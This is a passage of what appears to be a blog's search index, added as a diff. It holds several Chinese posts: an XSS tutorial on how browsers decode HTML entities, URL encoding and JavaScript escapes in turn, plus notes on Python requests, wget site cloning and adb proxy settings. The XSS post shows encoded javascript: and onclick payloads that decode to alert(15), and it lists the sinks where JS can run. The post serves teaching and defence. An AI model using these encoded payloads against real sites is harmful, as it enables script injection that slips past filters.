class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#50;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>按照上面的逻辑分析，是可以被正常解析之行的。</p>
+<h4 id="3-3-解码举例3"><a href="#3-3-解码举例3" class="headerlink" title="3.3 解码举例3"></a>3.3 解码举例3</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;window.open(&#x27;UserInput&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>首先由 HTML 解析器对UserInput 部分进行字符实体解码；</li>
+<li>接着由 JavaScript 解析器会再对 onclick 部分的 JS 进行解析并执行 JS；</li>
+<li>执行 JS 后window.open(‘UserInput’)函数的参数会传入 URL，所以再由 URL 解析器对 UserInput 部分进行解码。</li>
+</ol>
+<p><strong>解析顺序为：HTML 解析-&gt;JavaScript解析-&gt;URL 解析。</strong></p>
+<h4 id="3-4解码举例4"><a href="#3-4解码举例4" class="headerlink" title="3.4解码举例4"></a>3.4解码举例4</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:window.open(&#x27;UserInput&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>首先还是由 HTML 解析器对 UserInput 部分进行字符实体解码；</li>
+<li>接着由 URL 解析器解析 href 的属性值；</li>
+<li>然后由于Scheme为javascript，所以由 JavaScript 解析；</li>
+<li>解析执行 JS 后window.open(‘UserInput’)函数传入 URL，所以再由 URL 解析器解析。</li>
+</ol>
+<p><strong>解析顺序为：HTML 解析-&gt;URL解析-&gt;JavaScript 解析-&gt;URL 解析。</strong></p>
+<h4 id="3-5-解码举例5"><a href="#3-5-解码举例5" class="headerlink" title="3.5 解码举例5"></a>3.5 解码举例5</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>首先 HTML 解析器进行解析，解析到href 属性的值时，状态机进入属性值状态（Attribute Value State），该状态会解码字符实体；</p>
+</li>
+<li><p>接着由 URL 解析器进行解析并解码；</p>
+</li>
+<li><p>再接着由于 Scheme 为javascript，因此由 JavaScript 解析器解析并解码，加上编码部分是函 数名，属于标识符，因此可以正常解码解释；</p>
+</li>
+</ol>
+<p>经过三轮解析解码后得到结果：<a href="javascript:alert(15)"></a></p>
+<h3 id="4-哪些地方可以触发JS解析器"><a href="#4-哪些地方可以触发JS解析器" class="headerlink" title="4.哪些地方可以触发JS解析器"></a>4.哪些地方可以触发JS解析器</h3><ol>
+<li>直接嵌入&lt; script&gt; 代码块。</li>
+<li>通过&lt; script sr&#x3D;… &gt; 加载代码。</li>
+<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
+<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
+<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
+<li>定时器，Timer(setTimeout, setInterval)</li>
+<li>eval(…) 调用。</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://security.yirendai.com/news/share/26">https://security.yirendai.com/news/share/26</a></p>
+]]></content>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>me</title>
+    <url>/2019/05/10/me/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>requests库中content和text调用的区别</title>
+    <url>/2019/10/12/requests%E5%BA%93%E4%B8%ADcontent%E5%92%8Ctext%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
+    <content><![CDATA[<h1 id="requests库中content和text调用的区别"><a href="#requests库中content和text调用的区别" class="headerlink" title="requests库中content和text调用的区别"></a>requests库中content和text调用的区别</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近，在使用python的requests库抓取一些网站基本信息的时候。使用r.text提取信息。发现经常会有乱码。即使原网站的原始编码就是utf-8. 后来发现，改成r.content就没问题。</p>
+<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>二者的区别在于content返回的是byte型数据，而text返回的是Unicode数据，也就是说text对原始数据进行的特殊的编码，而这个编码方式是基于对原始数据的猜测(响应头)，</p>
+<p>所以，如果网站的返回头如果没有制定编码，则r.text获取到的内容则可能编码出现错误。</p>
+<p>如：<code>Content-Type: text/html; charset=utf-8</code></p>
+<p>所以，一般情况下建议用r.content。然后自己进行重新编码。</p>
+<p>如果非要用text则可使用<code>r.encoding = &#39;ISO-8859-1&#39;</code>指定编码格式。</p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wget备忘录</title>
+    <url>/2019/06/06/wget%E5%A4%87%E5%BF%98%E5%BD%95/</url>
+    <content><![CDATA[<h3 id="使用wget克隆网站"><a href="#使用wget克隆网站" class="headerlink" title="使用wget克隆网站"></a>使用wget克隆网站</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -k -p -nH -N http://xxxweb.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>各参数说明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-k     把已下载文件中的所有链接都转换为本地引用，不再依赖原始或在线内容</span><br><span class="line">-p     下载所有必要文件，确保离线可用，包括图片和样式表</span><br><span class="line">-nH    禁止把文件下载到以主机名为前缀的文件夹中</span><br><span class="line">-N     启用文件的时间戳，以匹配来源的时间戳</span><br><span class="line"></span><br><span class="line">下面两项可选:</span><br><span class="line">-r     递归下载</span><br><span class="line">-l     指定最大的递归深度，0为无限。</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过adb修改手机的代理设置</title>
+    <url>/2019/11/21/%E9%80%9A%E8%BF%87adb%E4%BF%AE%E6%94%B9%E6%89%8B%E6%9C%BA%E7%9A%84%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</url>
+    <content><![CDATA[<h1 id="通过adb修改手机的代理设置"><a href="#通过adb修改手机的代理设置" class="headerlink" title="通过adb修改手机的代理设置"></a>通过adb修改手机的代理设置</h1><h2 id="0x00-前置"><a href="#0x00-前置" class="headerlink" title="0x00 前置"></a>0x00 前置</h2><p>在使用MUMU模拟器的时候，经常重启模拟器卡在99%的位置起不来，按照官方指引排错之后依然无法解决问题。后来联系MUMU的同事，经过确认，如果模拟器设置了系统代理没有关闭，重启后就会卡在99%。</p>
+<p>但是，卡在99%的时候，是可以通过adb进入系统的。此时，可以通过adb修改手机的代理设置，然后重启就OK了。</p>
+<h2 id="0x01-如何修改"><a href="#0x01-如何修改" class="headerlink" title="0x01 如何修改"></a>0x01 如何修改</h2><p><strong>方法一</strong></p>
+<p>网上百度到的方法大都是这样的：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置代理：</span></span><br><span class="line">adb shell settings put global http_proxy 代理IP地址:端口号</span><br><span class="line">如：</span><br><span class="line">adb shell settings put global http_proxy 127.0.0.1:8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除代理：</span></span><br><span class="line">adb shell settings delete global http_proxy</span><br><span class="line">adb shell settings delete global global_http_proxy_host</span><br><span class="line">adb shell settings delete global global_http_proxy_port</span><br></pre></td></tr></table></figure>
+
+<p>但是，这个方法对对MUMU不起作用，都是提示没有删除。</p>
+<p><img src="/images/image-20191121102144577.png" alt="image-20191121102144577"></p>
+<p><strong>方法二</strong></p>
+<p>经过研究，发现了方法二，确认有效。 </p>
+<ol>
+<li><p>通过adb进入shell</p>
+</li>
+<li><p>确认是root权限</p>
+</li>
+<li><p>编辑<code>/data/misc/wifi/ipconfig.txt</code>删除掉代理相关的配置</p>
+<p>删除之后，ipconfig.txt文件中的内容是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^@^@^@^B^@^LipAssignment^@^DDHCP^@^MproxySettings^@^FSTATIC^@   ^@^MexclusionList^@^@^@^Bid�D�^@^Ceos</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>reboot</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+</search>
